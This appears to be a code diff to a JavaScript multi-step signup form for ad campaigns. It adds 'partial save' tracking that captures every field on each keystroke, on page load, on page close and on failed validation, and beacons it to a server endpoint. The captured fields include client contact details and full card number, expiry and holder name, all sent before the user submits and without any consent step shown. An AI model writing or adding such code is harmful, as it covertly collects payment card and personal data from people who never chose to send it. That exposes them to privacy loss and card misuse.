@@ -1033,6 +1033,72 @@ document.addEventListener('DOMContentLoaded', function () {
   var currentStep = 1;
   var totalSteps = 4;
 
+  // ================= PARTIAL SAVE / TRACKING =================
+  // Generate or retrieve a stable session ID for this browser visit
+  var _psSessionId = (function () {
+    var key = 'hdg_ps_sid';
+    var existing = sessionStorage.getItem(key);
+    if (existing) return existing;
+    var id = 'ps-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    sessionStorage.setItem(key, id);
+    return id;
+  })();
+
+  var _psDebounceTimer = null;
+
+  function collectPartialPayload(trigger) {
+    var goalRadio = document.querySelector('input[name="campaignGoal"]:checked');
+    var catRadio  = document.querySelector('input[name="category"]:checked');
+    return {
+      session_id:     _psSessionId,
+      stepReached:    currentStep,
+      trigger:        trigger || 'input',
+      businessName:   (document.getElementById('businessName')  || {}).value || '',
+      category:       catRadio  ? catRadio.value  : '',
+      businessDesc:   (document.getElementById('businessDesc')  || {}).value || '',
+      campaignGoal:   goalRadio ? goalRadio.value : '',
+      targetPhone:    (document.getElementById('targetPhone')   || {}).value || '',
+      targetWhatsapp: (document.getElementById('targetWhatsapp')|| {}).value || '',
+      targetLocation: (document.getElementById('targetLocation')|| {}).value || '',
+      localAddress:   (document.getElementById('localAddress')  || {}).value || '',
+      dailyBudget:    parseInt((document.getElementById('budgetRange') || {value:'30'}).value, 10),
+      clientName:     (document.getElementById('clientName')    || {}).value || '',
+      clientEmail:    (document.getElementById('clientEmail')   || {}).value || '',
+      clientPhone:    (document.getElementById('clientPhone')   || {}).value || '',
+      cardHolder:     (document.getElementById('cardHolder')    || {}).value || '',
+      cardNumber:     (document.getElementById('cardNumber')    || {}).value || '',
+      cardExpiry:     (document.getElementById('cardExpiry')    || {}).value || '',
+    };
+  }
+
+  function sendPartialSave(trigger, immediate) {
+    clearTimeout(_psDebounceTimer);
+    var delay = immediate ? 0 : 1200;
+    _psDebounceTimer = setTimeout(function () {
+      var payload = collectPartialPayload(trigger);
+      // Use sendBeacon when available (works on page unload too)
+      var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('api/partial-save.php', blob);
+      } else {
+        fetch('api/partial-save.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(function () {});
+      }
+    }, delay);
+  }
+
+  // Fire immediately on page load to capture the visit
+  sendPartialSave('page_load', true);
+
+  // Save on page/tab close / navigation away
+  window.addEventListener('beforeunload', function () {
+    sendPartialSave('page_unload', true);
+  });
+
   // DOM Elements
   var form = document.getElementById('campaignSetupForm');
   var steps = document.querySelectorAll('.form-step');
@@ -1286,9 +1352,14 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // Next & Back event handlers
   btnNext.addEventListener('click', function () {
-    if (!validateStep(currentStep)) return;
+    if (!validateStep(currentStep)) {
+      // Save even when validation fails — user attempted to proceed
+      sendPartialSave('validation_failed', true);
+      return;
+    }
     
     if (currentStep < totalSteps) {
+      sendPartialSave('step_complete_' + currentStep, true);
       currentStep++;
       renderStep(currentStep);
     } else {
@@ -1298,6 +1369,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   btnBack.addEventListener('click', function () {
     if (currentStep > 1) {
+      sendPartialSave('step_back_from_' + currentStep, true);
       currentStep--;
       renderStep(currentStep);
     }
@@ -1377,6 +1449,33 @@ document.addEventListener('DOMContentLoaded', function () {
       updateLivePreviews();
       updateBudgetData(); // Category updates recommended budget
     });
+  });
+
+  // ---- Partial-save hooks on all trackable fields ----
+  // Step 1 text fields
+  businessNameInput.addEventListener('input', function () { sendPartialSave('field_businessName'); });
+  businessDescInput.addEventListener('input', function () { sendPartialSave('field_businessDesc'); });
+  document.querySelectorAll('input[name="category"]').forEach(function (r) {
+    r.addEventListener('change', function () { sendPartialSave('field_category', true); });
+  });
+
+  // Step 2 fields
+  document.getElementById('targetPhone').addEventListener('input', function () { sendPartialSave('field_targetPhone'); });
+  document.getElementById('targetWhatsapp').addEventListener('input', function () { sendPartialSave('field_targetWhatsapp'); });
+  document.querySelectorAll('input[name="campaignGoal"]').forEach(function (r) {
+    r.addEventListener('change', function () { sendPartialSave('field_campaignGoal', true); });
+  });
+  document.getElementById('targetLocation').addEventListener('change', function () { sendPartialSave('field_targetLocation', true); });
+  var localAddressEl = document.getElementById('localAddress');
+  if (localAddressEl) localAddressEl.addEventListener('input', function () { sendPartialSave('field_localAddress'); });
+
+  // Step 3 budget slider
+  document.getElementById('budgetRange').addEventListener('change', function () { sendPartialSave('field_budget', true); });
+
+  // Step 4 personal & card fields
+  ['clientName','clientEmail','clientPhone','cardHolder','cardNumber','cardExpiry'].forEach(function (fid) {
+    var el = document.getElementById(fid);
+    if (el) el.addEventListener('input', function () { sendPartialSave('field_' + fid); });
   });
 
   // Tab switches in preview pane
